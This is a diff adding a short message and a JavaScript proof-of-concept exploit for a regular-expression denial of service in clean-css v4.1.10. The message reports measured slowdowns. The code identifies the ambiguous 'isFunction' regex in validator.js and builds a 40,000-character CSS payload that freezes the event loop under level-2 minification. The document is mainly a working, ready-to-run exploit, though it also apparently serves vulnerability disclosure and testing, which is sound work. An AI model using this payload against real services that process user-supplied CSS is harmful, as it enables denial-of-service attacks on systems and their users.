@@ -1,0 +1,37 @@
+Confirmed quadratic blowup (n=10000→205ms, n=40000→3s) through the real public API. Here's the exploit:
+
+```javascript
+// ReDoS / algorithmic-complexity DoS in clean-css (v4.1.10)
+//
+// lib/optimizer/validator.js builds a "function" matcher with the ambiguous
+// pattern: /^([A-Z]+(\-|[A-Z]|[0-9])+\(.*?\))$/i (isFunction), used by
+// lib/optimizer/level-2/can-override.js's `sameFunctionOrValue`/`areSameFunction`
+// to decide whether the `transform` property in one rule can override another
+// during level-2 "mergeAdjacentRules"/"overrideProperties" optimizations.
+//
+// Because two adjacent quantified groups share the same character class
+// ([A-Z] appears in both [A-Z]+ and (\-|[A-Z]|[0-9])+), the regex engine must
+// try an exponential/quadratic number of ways to split a long run of letters
+// that never terminates in "(...)", causing catastrophic backtracking.
+//
+// Any application that runs clean-css with level:2 (a common, documented
+// setting for better compression) over attacker-supplied CSS is vulnerable
+// to a trivial CPU-exhaustion DoS.
+
+const CleanCSS = require("clean-css");
+
+// Two adjacent rules with the same selector/property force can-override's
+// `transform` comparator (sameFunctionOrValue -> areSameFunction -> isFunction)
+// to run the vulnerable regex against attacker-controlled strings.
+const payload = "A".repeat(40000); // no '(' so the regex must fully backtrack
+const css = `a{transform:${payload}}\na{transform:${payload}2}`;
+
+console.log("Minifying malicious CSS (payload length: " + payload.length + ")...");
+const start = Date.now();
+
+new CleanCSS({ level: 2 }).minify(css, (err, output) => {
+  console.log("Blocked event loop for", Date.now() - start, "ms");
+});
+
+console.log("(this line only prints AFTER minify blocks the event loop for seconds)");
+```
